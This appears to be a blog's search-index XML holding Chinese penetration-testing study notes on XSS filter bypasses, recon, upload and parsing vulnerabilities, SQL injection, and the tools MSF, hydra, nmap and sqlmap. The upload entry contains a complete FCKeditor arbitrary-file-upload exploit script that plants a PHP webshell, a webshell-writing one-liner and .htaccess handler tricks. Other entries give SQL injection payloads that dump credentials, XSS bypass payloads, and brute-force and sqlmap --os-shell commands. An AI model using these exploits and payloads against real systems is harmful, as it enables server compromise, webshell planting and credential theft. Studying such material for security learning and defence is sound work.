<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常见XSS过滤绕过姿势总结</title>
      <link href="/2019/08/30/%E5%B8%B8%E8%A7%81XSS%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2019/08/30/%E5%B8%B8%E8%A7%81XSS%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-过滤了script标签"><a href="#1-过滤了script标签" class="headerlink" title="1.过滤了script标签"></a>1.过滤了script标签</h2><p>绕过方法：使用其他标签</p><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="2-过滤了斜杠"><a href="#2-过滤了斜杠" class="headerlink" title="2.过滤了斜杠"></a>2.过滤了斜杠</h2><p>绕过方法同上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="3-过滤了on事件"><a href="#3-过滤了on事件" class="headerlink" title="3.过滤了on事件"></a>3.过滤了on事件</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="number">1</span>)<span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-过滤了尖括号"><a href="#4-过滤了尖括号" class="headerlink" title="4.过滤了尖括号"></a>4.过滤了尖括号</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onmouseover=<span class="string">"alert(1)"</span></span><br></pre></td></tr></table></figure><p>本文没有进行闭合前面的标签，要自行根据实际情况来闭合</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈信息收集</title>
      <link href="/2019/08/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/08/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-查询真实IP"><a href="#1-查询真实IP" class="headerlink" title="1.查询真实IP"></a>1.查询真实IP</h2><a id="more"></a><p>(方便等下扫端口)<br>超级ping：<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br>如果只有一个IP说明没有使用CDN<br>如果有多个IP说明使用了CDN</p><h2 id="2-开放端口探测"><a href="#2-开放端口探测" class="headerlink" title="2.开放端口探测"></a>2.开放端口探测</h2><p>使用nmap扫描端口<br>命令如下<br>nmap -Ss ip地址<br>（半开扫描，不容易被防火墙拦截）</p><h2 id="3-whois信息"><a href="#3-whois信息" class="headerlink" title="3.whois信息"></a>3.whois信息</h2><p>在线工具：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><h2 id="4-子域名"><a href="#4-子域名" class="headerlink" title="4.子域名"></a>4.子域名</h2><p>意义：当主站难以下手的时候，可以通过子站来渗透</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p>site:baidu.com -www<br>排除不感兴趣的子域名</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><h4 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h4><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><h4 id="爆破枚举"><a href="#爆破枚举" class="headerlink" title="爆破枚举"></a>爆破枚举</h4><p>1.layer子域名挖掘机<br>2.subDomainsBrute</p><p>只是简单说一下基本方法，不够全面</p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞</title>
      <link href="/2019/08/21/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/21/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="文件过滤中，如何验证文件后缀"><a href="#文件过滤中，如何验证文件后缀" class="headerlink" title="文件过滤中，如何验证文件后缀"></a>文件过滤中，如何验证文件后缀</h2><a id="more"></a><h3 id="1-文件头验证"><a href="#1-文件头验证" class="headerlink" title="1.文件头验证"></a>1.文件头验证</h3><h3 id="2-文件类型验证"><a href="#2-文件类型验证" class="headerlink" title="2.文件类型验证"></a>2.文件类型验证</h3><h3 id="3-文件后缀验证"><a href="#3-文件后缀验证" class="headerlink" title="3.文件后缀验证"></a>3.文件后缀验证</h3><h3 id="修改文件头，伪造文件属性"><a href="#修改文件头，伪造文件属性" class="headerlink" title="修改文件头，伪造文件属性"></a>修改文件头，伪造文件属性</h3><h3 id="修改文件类型，伪造文件类型，MIME绕过（抓包改包）"><a href="#修改文件类型，伪造文件类型，MIME绕过（抓包改包）" class="headerlink" title="修改文件类型，伪造文件类型，MIME绕过（抓包改包）"></a>修改文件类型，伪造文件类型，MIME绕过（抓包改包）</h3><h3 id="增加多重后缀，伪造文件后缀，命名绕过"><a href="#增加多重后缀，伪造文件后缀，命名绕过" class="headerlink" title="增加多重后缀，伪造文件后缀，命名绕过"></a>增加多重后缀，伪造文件后缀，命名绕过</h3><h3 id="Js本地验证"><a href="#Js本地验证" class="headerlink" title="Js本地验证"></a>Js本地验证</h3><h3 id="00截断上传"><a href="#00截断上传" class="headerlink" title="%00截断上传"></a>%00截断上传</h3><h4 id="k1-php-00-jpg-00—-gt-url编码"><a href="#k1-php-00-jpg-00—-gt-url编码" class="headerlink" title="(k1.php%00.jpg)   %00—&gt;url编码"></a>(k1.php%00.jpg)   %00—&gt;url编码</h4><h4 id="Burp抓包"><a href="#Burp抓包" class="headerlink" title="Burp抓包"></a>Burp抓包</h4><p>常见的MIME类型<br>　　超文本标记语言文本 .html text/html<br>　　普通文本 .txt text/plain<br>　　RTF文本 .rtf application/rtf<br>　　GIF图形 .gif image/gif<br>　　JPEG图形 .jpeg,.jpg image/jpeg<br>　　au声音文件 .au audio/basic<br>　　MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>　　RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>　　MPEG文件 .mpg,.mpeg video/mpeg<br>　　AVI文件 .avi video/x-msvideo<br>　　GZIP文件 .gz application/x-gzip<br>　　TAR文件 .tar application/x-tar</p><h2 id="编辑器上传漏洞利用"><a href="#编辑器上传漏洞利用" class="headerlink" title="编辑器上传漏洞利用"></a>编辑器上传漏洞利用</h2><p>网站编辑器：<br>Eweb,fck,ce,cfinder,ck  第三方组件<br>编辑器漏洞利用：<br>获取编辑器的名称及版本信息<br>扫描爬行或字典扫描 探针<br>观察图片的地址或编辑器特征<br>获取编辑器相关的漏洞<br>利用编辑器漏洞进行攻击测试<br>Ewebeditor：<br>默认后台：ewebeditor/admin_login.asp<br>默认数据库：ewebeditor/db/ewebeditor.mdb<br>默认账号密码：admin admin/admin888<br>FCK<br>查看版本：/_whatsnew.html<br>编辑器页：/_samples/default.html<br>.htaccess<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>代码：<br>&lt;filesmatch “wtf”&gt;<br>sethandler application/x-httpd-php<br><br>实战意义：<br>1.如果存在可以上传.htaccss文件，就可以直接利用规则解析<br>2.如果存在修改.htaccess文件权限，修改解析规则</p><h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><p>IIS 6.0解析利用方法有两种<br>1.目录解析<br>/xx.asp/xx.jpg<br>2.文件解析<br>xx.asp;.jpg<br>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 xx.asp，那么<br>/xx.asp/1.jpg<br>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。<br>第二种，在IIS6.0下，分号后面的不被解析，也就是说<br>xx.asp;.jpg<br>会被服务器看成是xx.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种<br>/xx.asa /xx.cer /xx.cdx</p><h2 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><p>Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…<br>在默认Fast-CGI开启状况下,黑阔上传一个名字为xx.jpg，内容为<br><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>‘);?&gt;<br>的文件，然后访问xx.jpg/.php,在这个目录下就会生成一句话木马 shell.php<br>Nginx &lt;8.03 空字节代码执行漏洞<br>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问<br>xxx.jpg%00.php<br>来执行其中的代码</p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如 xx.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xx.php.owf.rar解析成php.<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀<br>其他<br>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。<br>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br>&lt;FilesMatch “xx.jpg”&gt; SetHandler application/x-httpd-php <br>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p><h2 id="FCK编辑器漏洞"><a href="#FCK编辑器漏洞" class="headerlink" title="FCK编辑器漏洞"></a>FCK编辑器漏洞</h2><p>/3/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=%2F&amp;NewFolderName=a<br>CurrentFolder=/&amp;NewFolderName=a   /a<br>CurrentFolder=/a,asp&amp;NewFolderName=a     /a.asp/a<br>Ewebeditror   fck漏洞利用</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>/ewebeditor/admin_uploadfile.asp?id=42&amp;dir=../../..</p><h2 id="FCK-lt-2-63-EXP"><a href="#FCK-lt-2-63-EXP" class="headerlink" title="FCK=&lt;=2.63 EXP"></a>FCK=&lt;=2.63 EXP</h2><?phperror_reporting(0);set_time_limit(0);ini_set("default_socket_timeout", 5);define(STDIN, fopen("php://stdin", "r"));$match = array();function http_send($host, $packet){$sock = fsockopen($host, 80);while (!$sock){print "\n[-] No response from {$host}:80 Trying again...";$sock = fsockopen($host, 80);}fputs($sock, $packet);while (!feof($sock)) $resp .= fread($sock, 1024);fclose($sock);print $resp;return $resp;}function connector_response($html){global $match;return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));}print "\n+------------------------------------------------------------------+";print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";print "\n+------------------------------------------------------------------+\n";if ($argc < 3){print "\nUsage......: php $argv[0] host path\n";print "\nExample....: php $argv[0] localhost /\n";print "\nExample....: php $argv[0] localhost /FCKEditor/\n";die();}$host = $argv[1];$path = ereg_replace("(/){2,}", "/", $argv[2]);$filename = "fvck.gif";$foldername = "fuck.php%00.gif";$connector = "editor/filemanager/connectors/php/connector.php";$payload = "-----------------------------265001916915724\r\n";$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";$payload .= "Content-Type: image/jpeg\r\n\r\n";$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[wtf]) ?><p>‘.”\n”;<br>$payload .= “—————————–265001916915724–\r\n”;<br>$packet = “POST {$path}{$connector}?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=”.$foldername.” HTTP/1.0\r\n”;//print $packet;<br>$packet .= “Host: {$host}\r\n”;<br>$packet .= “Content-Type: multipart/form-data; boundary=—————————265001916915724\r\n”;<br>$packet .= “Content-Length: “.strlen($payload).”\r\n”;<br>$packet .= “Connection: close\r\n\r\n”;<br>$packet .= $payload;<br>print $packet;<br>if (!connector_response(http_send($host, $packet))) die(“\n[-] Upload failed!\n”);<br>else print “\n[-] Job done! try http://${host}/$match[2] \n”;<br>?&gt;<br>webshell密码：wtf</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF简单使用</title>
      <link href="/2019/08/20/MSF%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/08/20/MSF%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="MSF常用命令"><a href="#MSF常用命令" class="headerlink" title="MSF常用命令"></a>MSF常用命令</h2><a id="more"></a><p>Help 帮助<br>Back 返回<br>? 查看命令帮助<br>Show 列出所有<br>Show payload 列出所有攻击载荷<br>Search name 搜索<br>Info 展示出指定渗透攻击或模块的相关信息<br>Use 选择一个渗透攻击或模块</p><p>1.打开MSF<br>2.选择模块 use name<br>3.查看模块需要哪些信息 show op<br>4.告诉MSF所需的信息 set 变量 值<br>5.你要告诉MSF 入侵 之后 你要他的CMD  或者 什么都不做 我就想执行一条命令 但是后面我还想控制<br>6.Set payload name 选择其中一个payload<br>7.启动 run</p><p>Show targers 列出渗透攻击所支持的目标平台</p><p>payload名称命名规则：<br>_find_tag:在一个已建立的连接上<br>_reverse_tcp:反向连接到攻击者主机<br>bind_tcp:监听一个tcp连接<br>reverse_http：反向连接 通过HTTP隧道</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2019/08/20/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/08/20/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><a id="more"></a><pre><code>version()  MySQL 版本user()  数据库用户名database() 数据库名@@datadir 数据库路径@@version_compile_os  操作系统版本hex() 把十进制转为十六进制concat() 连接字符串ascii() ascii编码length() 获取长度substring() mid（） 取出字符串group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据updatexml()、extractvalue() 用于报错注入sleep（）  休眠</code></pre><h2 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h2><p> magic_quotes_gpc 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p><h2 id="安全函数"><a href="#安全函数" class="headerlink" title="安全函数"></a>安全函数</h2><p>addslashes()<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。 </p><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>编码绕过<br>宽字节绕过</p><h2 id="Mysql高权限垮库注入"><a href="#Mysql高权限垮库注入" class="headerlink" title="Mysql高权限垮库注入"></a>Mysql高权限垮库注入</h2><p>需要root权限<br>网站A 无注入 网站B有MYSQL注入 并且被统一管理的话<br>可以实现Mysql高权限垮库注入</p><h3 id="查询所有库名"><a href="#查询所有库名" class="headerlink" title="查询所有库名"></a>查询所有库名</h3><p><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata</p><h3 id="获取指定数据库的所有表名"><a href="#获取指定数据库的所有表名" class="headerlink" title="获取指定数据库的所有表名"></a>获取指定数据库的所有表名</h3><p><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=十六进制dataname</p><h3 id="获取指定表的列名"><a href="#获取指定表的列名" class="headerlink" title="获取指定表的列名"></a>获取指定表的列名</h3><p><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name=十六进制tablename</p><h3 id="获取指定数据"><a href="#获取指定数据" class="headerlink" title="获取指定数据"></a>获取指定数据</h3><p><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,username,userpwd from ekucms.ekud249_user</p><h2 id="常见注入方式："><a href="#常见注入方式：" class="headerlink" title="常见注入方式："></a>常见注入方式：</h2><p>提交方式注入<br>POST登录框注入<br>先加’在构建SQL注入语句<br>Cookie验证注入<br>抓包改包注入<br>HTTP头部注入<br>实际情况下，有部分站点接受数据是以http数据包中的http头部进去数据接受，所以测试注入点的时候，需要将注入语句写到http头部中<br>写到该写的地方<br>参数类型注入<br>数字，字符，搜索<br>数字型：<br>$id=$_GET[‘x’]<br>Select * from news where id=1<br>字符型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’admin’<br>先加’ 再构建SQL语句<br>搜索型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’%mst%’<br>先加%’ </p><p>加解密注入<br>常用加密方式<br>URL编码 base64 …..</p><h2 id="盲注原理"><a href="#盲注原理" class="headerlink" title="盲注原理"></a>盲注原理</h2><p>普通联合注入和盲注区别<br>普通注入：效率高 兼容性差<br>盲注：效率低 兼容性高<br>基于时间延长注入</p><h2 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h2><p>Sleep()延时<br>If(条件,真,假)条件判断<br>Mid(str,1,1) 截取<br>Ord ascii()<br>Length()<br>获取数据库名长度<br><a href="http://127.0.0.1/sql/0.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=1</a> and sleep(if((select length(database()) = 7),0,5))<br>获取表名<br>Union select 1,2,3 sleep(if(length(table_name) = 4,0,5)) from information_schema.tables where table_schema =database() limit 0,1</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2019/08/20/XSS/"/>
      <url>/2019/08/20/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS原理：输出问题导致的js代码被识别执行"><a href="#XSS原理：输出问题导致的js代码被识别执行" class="headerlink" title="XSS原理：输出问题导致的js代码被识别执行"></a>XSS原理：输出问题导致的js代码被识别执行</h2><a id="more"></a><h3 id="Xss技术分类"><a href="#Xss技术分类" class="headerlink" title="Xss技术分类"></a>Xss技术分类</h3><p>反射型（非持久型）<br>存储型（持久型）<br>DOM型</p><h3 id="Xss常见攻击"><a href="#Xss常见攻击" class="headerlink" title="Xss常见攻击"></a>Xss常见攻击</h3><p>盗取Cookie<br>Xss漏洞发现并利用<br>Beef使用</p><h3 id="Cookie维持权限应用"><a href="#Cookie维持权限应用" class="headerlink" title="Cookie维持权限应用"></a>Cookie维持权限应用</h3><p>条件<br>1.已经获得网站webshell权限<br>2.网站后台目录文件有可写权限<br>利用原理<br>通过修改后台登录成功指向文件,利用js代码获取每次登录成功的cookie(管理员权限)</p><h2 id="Xss相关防护过滤及绕过分析"><a href="#Xss相关防护过滤及绕过分析" class="headerlink" title="Xss相关防护过滤及绕过分析"></a>Xss相关防护过滤及绕过分析</h2><h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><p>1.关键字过滤<br>2.特殊符号过滤<br>3.字符长度过滤<br>4.转义编码防护</p><h3 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h3><p>1.改变大小写<br>2.使用空白符<br>3.HEX编码<br>4.其他标签调用<br>5.Js自带函数</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hydra使用</title>
      <link href="/2019/08/04/hydra%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/08/04/hydra%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="hydra参数详解"><a href="#hydra参数详解" class="headerlink" title="hydra参数详解"></a>hydra参数详解</h2><p>-R：继续从上一次进度接着破解<br>-S：大写，采用SSL链接</p><a id="more"></a><p>-s <port>：小写，可通过这个参数指定非默认端口<br>-l <login>：指定破解的用户，对特定用户破解<br>-L <file>：指定用户名字典<br>-p <pass>：小写，指定密码破解，少用，一般是采用密码字典<br>-P <file>：大写，指定密码字典<br>-e <ns>：可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C <file>：使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M <file>：指定目标列表文件一行一条<br>-o <file>：指定结果输出文件<br>-f：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br>-t <tasks>：同时运行的线程数，默认为16<br>-w <time>：设置最大超时的时间，单位秒，默认是30s<br>-v / -V：显示详细过程<br>-o 可导出文件<br>server：目标ip </time></tasks></file></file></file></ns></file></pass></file></login></port></p><p>hydra -L ./user.txt -P ./pass.txt -t 2 -e n -f -v -s 3306 192.168.0.57 mysql<br>爆破mysql</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google hacking</title>
      <link href="/2019/07/30/googlehacking/"/>
      <url>/2019/07/30/googlehacking/</url>
      
        <content type="html"><![CDATA[<p>Google搜索基本符号意义</p><a id="more"></a><p>“”<br>完全匹配搜索<br>+<br>指定一个一定存在的关键词<br>-<br>排除关键词<br>|<br>或，只要满足其中一个就行<br>AND<br>同时满足两个关键词<br>site搜索语法的意义<br>作用：<br>1.可以针对目标做一个准确的信息收集（目录 文件）<br>2.得到目标的子域名<br>3.查找后台<br>Site:<br>//搜索指定域名下的结果<br>Site:baidu.com<br>Inurl搜索语法的意义<br>批量找后台，找注入点，批量找指定漏洞目标网站点等等<br>Inurl:baidu.com<br>//表示搜索结果的URL中一定含有baidu.com这个关键词<br>批量找后台<br>找注入点，<br>批量找指定漏洞目标网站点<br>等等<br>Intitle搜索语法的意义<br>批量寻找后台，批量寻找弱点网站<br>Intitle:<br>//搜索标题为指定内容的结果<br>可以使用不同的关键词，达到同样的效果<br>组合使用<br>inurl:    intitle:<br>Cache缓存搜索<br>Cache<br>//类似于百度快照功能<br>用途<br>找物理路径时，网站异常被恢复时可以使用这个语法来进行搜索<br>查看网站被删除信息时，也可以使用这个语法</p><p>Tips：<br>搜索语法使用时，百度和谷歌尽量都尝试一遍</p><p>拓展玩法<br>1.找管理员账户名<br>2.找目标脚本语言<br>3.找C段主机<br>4.找弱点站</p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap使用</title>
      <link href="/2019/07/26/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/07/26/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>tips:不定时更新，边学变更新</p><h2 id="iL"><a href="#iL" class="headerlink" title="-iL"></a>-iL</h2><p>扫文本<br>nmap -iL test.txt</p><a id="more"></a><h2 id="–exclude"><a href="#–exclude" class="headerlink" title="–exclude"></a>–exclude</h2><p>排除IP<br>nmap 192.168.0.* –exclue 192.168.0.1</p><h2 id="sA"><a href="#sA" class="headerlink" title="-sA"></a>-sA</h2><p>是否开防火墙</p><h2 id="sP"><a href="#sP" class="headerlink" title="-sP"></a>-sP</h2><p>检测主机在线</p><h2 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h2><p>只扫描哪些端口</p><h2 id="sS"><a href="#sS" class="headerlink" title="-sS"></a>-sS</h2><p>半开扫描</p><h2 id="T4"><a href="#T4" class="headerlink" title="-T4"></a>-T4</h2><p>级别越高，速度越快</p><h2 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h2><p>全面系统检测、启用脚本检测、扫描等</p><h2 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h2><p>显示扫描过程</p><h2 id="Nmap探测WAF有两种脚本，"><a href="#Nmap探测WAF有两种脚本，" class="headerlink" title="Nmap探测WAF有两种脚本，"></a>Nmap探测WAF有两种脚本，</h2><p>一种是http-waf-detect，命令：nmap -p80,443 –script=http-waf-detect ip<br>一种是http-waf-fingerprint。命令：nmap -p80,443 –script=http-waf-fingerprint ip</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLmap学习笔记</title>
      <link href="/2019/07/25/SQLmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/07/25/SQLmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="SQLmap学习笔记"><a href="#SQLmap学习笔记" class="headerlink" title="SQLmap学习笔记"></a>SQLmap学习笔记</h2><h3 id="–常用参数"><a href="#–常用参数" class="headerlink" title="–常用参数"></a>–常用参数</h3><h4 id="u-检测注入"><a href="#u-检测注入" class="headerlink" title="-u 检测注入"></a>-u 检测注入</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1”</p><a id="more"></a><h4 id="–data-针对POST请求的链接"><a href="#–data-针对POST请求的链接" class="headerlink" title="–data 针对POST请求的链接"></a>–data 针对POST请求的链接</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php” –data=”id=1”</p><h4 id="–forms-检测表单是否存在注入"><a href="#–forms-检测表单是否存在注入" class="headerlink" title="–forms 检测表单是否存在注入"></a>–forms 检测表单是否存在注入</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –forms</p><h4 id="–level-等级-1-5"><a href="#–level-等级-1-5" class="headerlink" title="–level 等级 1-5"></a>–level 等级 1-5</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –level 3</p><h4 id="–dbs-列出所有库"><a href="#–dbs-列出所有库" class="headerlink" title="–dbs 列出所有库"></a>–dbs 列出所有库</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dbs</p><h4 id="–current-db-列出当前库"><a href="#–current-db-列出当前库" class="headerlink" title="–current-db 列出当前库"></a>–current-db 列出当前库</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-db</p><h4 id="–tables-D””-指定库里的所有表"><a href="#–tables-D””-指定库里的所有表" class="headerlink" title="–tables -D”” 指定库里的所有表"></a>–tables -D”” 指定库里的所有表</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables -D”saltest”</p><h4 id="–tables-所有表"><a href="#–tables-所有表" class="headerlink" title="–tables 所有表"></a>–tables 所有表</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables</p><h4 id="–dump-T””-D””-C””-指定列下的字段"><a href="#–dump-T””-D””-C””-指定列下的字段" class="headerlink" title="–dump -T”” -D”” -C”” 指定列下的字段"></a>–dump -T”” -D”” -C”” 指定列下的字段</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dump -T”news” -D “sqltest” -C”id”</p><h4 id="–current-user-当前用户名"><a href="#–current-user-当前用户名" class="headerlink" title="–current-user 当前用户名"></a>–current-user 当前用户名</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-user</p><h4 id="–os-shell-打开一个终端"><a href="#–os-shell-打开一个终端" class="headerlink" title="–os-shell 打开一个终端"></a>–os-shell 打开一个终端</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –os-shell</p><h4 id="m-扫描文本里的地址"><a href="#m-扫描文本里的地址" class="headerlink" title="-m 